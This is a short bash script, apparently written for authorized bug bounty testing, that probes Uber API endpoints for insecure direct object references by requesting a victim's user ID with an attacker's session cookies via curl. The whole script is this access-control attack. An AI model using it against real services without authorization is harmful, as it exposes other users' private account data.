#!/bin/bash
# IDOR Testing Script for Uber Bug Bounty
# Usage: ./idor-test.sh <endpoint> <attacker_cookie> <victim_id>

set -e

ENDPOINT="$1"
COOKIE="$2"
VICTIM_ID="$3"

HEADERS=(
    -H "X-Bug-Bounty: HackerOne-aynorica"
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    -H "Accept: application/json"
)

if [ -z "$ENDPOINT" ] || [ -z "$COOKIE" ]; then
    echo "Usage: ./idor-test.sh <endpoint> <cookie_file> [victim_id]"
    echo ""
    echo "Examples:"
    echo "  ./idor-test.sh https://api.uber.com/v1/me cookies-a.txt"
    echo "  ./idor-test.sh 'https://api.uber.com/v1/users/{id}' cookies-a.txt victim-uuid-here"
    exit 1
fi

# If victim ID provided, substitute in endpoint
if [ -n "$VICTIM_ID" ]; then
    ENDPOINT="${ENDPOINT//\{id\}/$VICTIM_ID}"
    ENDPOINT="${ENDPOINT//\{uuid\}/$VICTIM_ID}"
fi

echo "===== IDOR Test ====="
echo "Endpoint: $ENDPOINT"
echo "Cookie file: $COOKIE"
echo ""

# Make request
echo "Response:"
curl -s -w "\n\nHTTP Status: %{http_code}\n" \
    "${HEADERS[@]}" \
    -b "$COOKIE" \
    "$ENDPOINT" | head -100

echo ""
echo "===== End ====="
